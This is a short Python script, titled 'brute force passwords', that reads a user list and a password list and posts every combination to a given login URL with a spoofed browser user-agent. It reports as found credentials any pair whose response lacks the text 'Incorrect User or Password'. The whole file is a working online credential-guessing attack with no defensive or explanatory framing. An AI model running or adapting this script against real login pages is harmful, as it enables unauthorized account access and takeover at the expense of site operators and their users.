# brute force passwords
import sys
import urllib.parse
import urllib.request

if len(sys.argv) != 4:
    print("usage: {} url userlist passwordlist".format(sys.argv[0]))
    sys.exit(0)

url = str(sys.argv[1])
filename1 = str(sys.argv[2])
filename2 = str(sys.argv[3])

with open(filename1, 'r') as userlist, open(filename2, 'r') as passwordlist:
    foundcreds = []
    FailStr = "Incorrect User or Password"

    users = userlist.read().splitlines()
    passwords = passwordlist.read().splitlines()

    for user in users:
        for password in passwords:
            data = urllib.parse.urlencode({"username": user, "password": password}).encode('utf-8')
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}
            request = urllib.request.Request(url, data=data, headers=headers)
            try:
                with urllib.request.urlopen(request) as response:
                    response_text = response.read().decode('utf-8')
                    if response_text.find(FailStr) < 0:
                        foundcreds.append(user + ":" + password)
            except urllib.error.HTTPError as e:
                print(f"HTTP error occurred: {e.code} - {e.reason}")
            except urllib.error.URLError as e:
                print(f"URL error occurred: {e.reason}")

if foundcreds:
    print("Found User and Password combinations:\n")
    for name in foundcreds:
        print(name)
else:
    print("No users found")

